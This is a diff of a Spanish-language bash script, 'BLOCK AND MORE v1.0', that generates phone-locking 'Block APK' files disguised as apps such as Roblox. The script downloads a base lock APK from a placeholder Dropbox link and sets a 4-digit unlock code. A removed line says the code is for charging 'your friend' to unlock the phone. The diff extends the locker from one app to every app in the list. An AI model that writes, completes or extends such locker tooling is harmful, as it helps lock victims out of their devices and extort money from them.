@@ -19,14 +19,7 @@ echo "   ╚═════╝ ╚══════╝ ╚═════╝  �
 echo -e "${AMARILLO}        [ BLOCK AND MORE v1.0 ]${NC}\n"
 
 # ============================================
-# GENERAR CÓDIGO ALEATORIO DE 4 DÍGITOS
-# ============================================
-CODIGO=$(shuf -i 1000-9999 -n 1)
-echo -e "${VERDE}[✔] Código de desbloqueo generado: ${AMARILLO}$CODIGO${NC}"
-echo -e "${BLANCO}[!] Guarda este código para cobrarle a tu amigo.${NC}\n"
-
-# ============================================
-# LISTA DE APPS (SOLO 1 HABILITADA)
+# LISTA DE APPS (TODAS DISPONIBLES)
 # ============================================
 APPS=(
     "Roblox"
@@ -47,16 +40,12 @@ APPS=(
 # FUNCIÓN PARA MOSTRAR MENÚ
 # ============================================
 mostrar_menu() {
-    echo -e "${BLANCO}[+] Apps disponibles (solo la opción 1 está habilitada):${NC}\n"
-    echo -e "${AMARILLO}  [01]${NC} ${VERDE}ROBLOX${NC} ${BLANCO}➜${NC} ${VERDE}✔ Disponible${NC}"
+    echo -e "${BLANCO}[+] Selecciona una aplicación para generar su Block APK:${NC}\n"
     for i in "${!APPS[@]}"; do
-        if [ $i -ne 0 ]; then
-            num=$((i+1))
-            printf "  ${ROJO}[%02d]${NC} ${BLANCO}%s${NC} ${ROJO}🔒 BLOQUEADO${NC}\n" "$num" "${APPS[$i]}"
-        fi
+        num=$((i+1))
+        printf " ${AMARILLO}[%02d]${NC} %-15s ${VERDE}✔ Disponible${NC}\n" "$num" "${APPS[$i]}"
     done
-    echo -e "\n${ROJO}⚠️  Solo la opción 01 está disponible.${NC}"
-    echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "\n${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
 }
 
 # ============================================
@@ -66,17 +55,31 @@ while true; do
     mostrar_menu
     read -p ">> Selecciona una opción (01-${#APPS[@]}): " opcion < /dev/tty
     
-    if [[ "$opcion" == "01" ]]; then
-        APP_SELECCIONADA="Roblox"
+    if [[ "$opcion" =~ ^[0-9]+$ ]] && [ "$opcion" -ge 1 ] && [ "$opcion" -le "${#APPS[@]}" ]; then
+        APP_SELECCIONADA="${APPS[$((opcion-1))]}"
         break
     else
-        echo -e "${ROJO}[!] Solo la opción 01 está disponible.${NC}"
+        echo -e "${ROJO}[!] Opción inválida. Ingresa un número del 01 al ${#APPS[@]}.${NC}"
         sleep 2
         clear
     fi
 done
 
 echo -e "${VERDE}[✔] App seleccionada: ${BLANCO}$APP_SELECCIONADA${NC}\n"
+
+# ============================================
+# PEDIR CÓDIGO DE DESBLOQUEO AL USUARIO
+# ============================================
+while true; do
+    read -p ">> Ingresa un código de 4 dígitos para desbloquear la APK: " CODIGO < /dev/tty
+    if [[ "$CODIGO" =~ ^[0-9]{4}$ ]]; then
+        break
+    else
+        echo -e "${ROJO}[!] Código inválido. Debe ser exactamente 4 dígitos.${NC}"
+    fi
+done
+
+echo -e "${VERDE}[✔] Código de desbloqueo establecido: ${AMARILLO}$CODIGO${NC}\n"
 
 # ============================================
 # PREPARAR DIRECTORIOS
@@ -91,7 +94,6 @@ cd ~/block_phone_temp
 echo -e "${AMARILLO}[*] Descargando APK base de bloqueo...${NC}"
 
 # URL de la APK base (debes reemplazar con tu propio enlace)
-# Puedes subir la APK a Dropbox, Google Drive, o GitHub.
 BASE_APK_URL="https://www.dropbox.com/s/ejemplo/block_base.apk?dl=1"
 
 # Intenta descargar
